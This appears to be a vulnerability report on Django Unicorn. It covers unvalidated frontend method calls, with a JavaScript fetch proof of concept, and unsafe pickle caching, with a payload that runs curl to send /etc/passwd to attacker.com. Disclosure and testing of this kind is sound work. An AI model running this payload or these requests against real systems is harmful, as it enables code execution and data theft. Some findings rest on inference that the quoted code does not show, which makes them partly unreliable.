# VULNERABILITIES

## 1. Arbitrary Method Execution Vulnerability in Unicorn's Method Parsing

### Description
Django Unicorn allows calling component methods from the frontend via AJAX requests. The method parsing mechanism in `call_method_parser.py` uses `ast.parse` to parse method names from strings, which is safer than `eval`, but there's no validation to ensure that only methods intended to be exposed to the frontend can be called. An attacker with access to a publicly available instance can craft malicious AJAX requests to call any method on a component, including sensitive methods that were not intended to be called from the frontend.

Steps to trigger the vulnerability:
1. Identify a Django Unicorn application with publicly accessible components
2. Determine component names and IDs either through source inspection or educated guessing
3. Create a malicious AJAX request that calls a sensitive method on the component
4. Send the request with proper CSRF token and component ID
5. The method is executed on the server despite not being intended for frontend access

### Impact
An attacker could potentially call any method on a component, including private or internal methods that may:
- Access or modify sensitive data
- Perform privileged operations
- Execute server-side commands
- Access resources that should be protected

This can lead to unauthorized actions, information disclosure, and potential further compromise of the application.

### Vulnerability Rank
High

### Currently Implemented Mitigations
- The code uses `ast.parse` instead of `eval` for parsing method calls
- The framework has a list of protected methods in `_is_public`, but it doesn't appear to be enforced for AJAX requests
- CSRF protection is implemented to prevent cross-site requests
- Checksum validation is used to validate component state (evidenced in test_hash.py)

### Missing Mitigations
- No explicit whitelist of methods that can be called from the frontend
- No decorator or attribute to mark methods as safe for frontend calls
- No validation during method execution to ensure the method should be publicly accessible

### Preconditions
- Attacker can send AJAX requests to a publicly available Unicorn application
- The attacker has knowledge of component method names or can guess them
- The application uses Unicorn components with sensitive methods

### Source Code Analysis
In `call_method_parser.py`, the `parse_call_method_name` function is used to parse method names from strings:

```python
def parse_call_method_name(call_method_name: str) -> Tuple[str, Tuple[Any, ...], Mapping[str, Any]]:
    is_special_method = False
    args: List[Any] = []
    kwargs: Dict[str, Any] = {}
    method_name = call_method_name

    # Deal with special methods that start with a "$"
    if method_name.startswith("$"):
        is_special_method = True
        method_name = method_name[1:]

    tree = ast.parse(method_name, "eval")
    statement = tree.body[0].value

    if tree.body and isinstance(statement, ast.Call):
        call = tree.body[0].value
        method_name = call.func.id
        args = [eval_value(arg) for arg in call.args]
        kwargs = {kw.arg: eval_value(kw.value) for kw in call.keywords}

    # Add "$" back to special functions
    if is_special_method:
        method_name = f"${method_name}"

    return method_name, tuple(args), MappingProxyType(kwargs)
```

From the test files (test_set_property.py, test_toggle.py), we can see that Django Unicorn supports direct property setting through method calls (e.g., `count=2`) and special methods like `$toggle('check')`. These methods are processed without validating if they should be accessible from the frontend.

The test files also show that both simple and nested properties can be modified (e.g., `nested.check=True`), increasing the attack surface.

### Security Test Case
1. Identify a Django Unicorn application with publicly accessible components
2. Inspect the page source to find component names and IDs
3. Create an HTML page with JavaScript that sends an AJAX request to the Unicorn endpoint:
   ```javascript
   // Get CSRF token from the target site
   const csrfToken = document.querySelector('[name=csrfmiddlewaretoken]').value;

   fetch('/unicorn/message/path.to.component.ComponentName', {
     method: 'POST',
     headers: {
       'Content-Type': 'application/json',
       'X-CSRFToken': csrfToken
     },
     body: JSON.stringify({
       "actionQueue": [
         {
           "payload": {"name": "sensitive_internal_method()"},
           "type": "callMethod"
         }
       ],
       "data": {}, // Component data
       "checksum": "valid_checksum_here", // Get this by intercepting a legitimate request
       "id": "component_id_here", // Component ID from the DOM
       "epoch": Date.now() / 1000
     })
   })
   .then(response => response.json())
   .then(data => console.log(data));
   ```
4. Execute the request and observe if the sensitive method is executed
5. Try variations such as calling methods with `$` prefix or setting properties directly (`property=value`)

## 2. Unsafe Pickle Deserialization in Component Caching

### Description
Django Unicorn uses Python's `pickle` module to serialize and deserialize components for caching in `cacher.py`. Pickle deserialization is inherently unsafe if the cached data is compromised, as it could lead to arbitrary code execution. An attacker who can somehow manipulate the cached data could insert a malicious pickled object that executes arbitrary code when deserialized.

Step by step to trigger:
1. Find a way to compromise or manipulate the cache used by Unicorn
2. Create a malicious pickled object that executes arbitrary code
3. Insert this object into the cache under a component's cache key
4. Wait for the application to load the component from cache

### Impact
If successfully exploited, an attacker could:
- Execute arbitrary Python code on the server
- Access sensitive data
- Make unauthorized changes to the application
- Potentially gain full control of the server

This is a high-severity issue because it can lead to complete system compromise.

### Vulnerability Rank
High

### Currently Implemented Mitigations
- Some error checking during deserialization process
- Cache access typically requires server access, which raises the exploitation difficulty

### Missing Mitigations
- No use of safer serialization formats (like JSON with custom serialization/deserialization)
- No integrity checks on cached data
- No validation of deserialized objects to ensure they match expected structure
- No memory isolation for pickle deserialization

### Preconditions
- Attacker must be able to compromise the cache or inject malicious pickled data
- The application must be using Django Unicorn with caching enabled
- The vulnerability requires a relatively sophisticated attack vector

### Source Code Analysis
In `cacher.py`, the `restore_from_cache` function retrieves and deserializes components from the cache:

```python
def restore_from_cache(component_cache_key: str, request: Optional[HttpRequest] = None) -> "django_unicorn.views.UnicornView":
    cache = caches[get_cache_alias()]
    cached_component = cache.get(component_cache_key)

    if cached_component:
        roots = {}
        root: django_unicorn.views.UnicornView = cached_component
        roots[root.component_cache_key] = root

        while root.parent:
            root = cache.get(root.parent.component_cache_key)
            roots[root.component_cache_key] = root

        to_traverse: List[django_unicorn.views.UnicornView] = []
        to_traverse.append(root)

        while to_traverse:
            current = to_traverse.pop()
            current.setup(request)
            current._validate_called = False
            current.calls = []

            for index, child in enumerate(current.children):
                key = child.component_cache_key
                cached_child = roots.pop(key, None) or cache.get(key)

                cached_child.parent = current
                current.children[index] = cached_child
                to_traverse.append(cached_child)

    return cached_component
```

The code uses Python's `pickle` module without any additional security measures to validate or verify the integrity of the deserialized data.

### Security Test Case
The following test demonstrates the vulnerability, but requires access to the cache:

1. Create a malicious pickle payload:
```python
import pickle
import os

class EvilPickle:
    def __reduce__(self):
        cmd = ('curl -d "data=$(cat /etc/passwd)" https://attacker.com/exfil')
        return os.system, (cmd,)

# Create the malicious pickle data
evil_data = pickle.dumps(EvilPickle())

# This would need to be inserted into the cache under a component's cache key
# For example:
# from django.core.cache import caches
# cache = caches['default']
# cache.set('unicorn:component:target_component_id', evil_data)
```

2. When the application loads the component from cache, the malicious code would execute
3. To verify this vulnerability in a controlled environment:
   - Set up a test Django project using Unicorn with caching enabled
   - Configure it to use a cache backend that you can access (like file-based cache)
   - Create a component that gets cached
   - Manually replace the cached data with your malicious pickle
   - Trigger a request that loads the component from cache
   - Observe the code execution
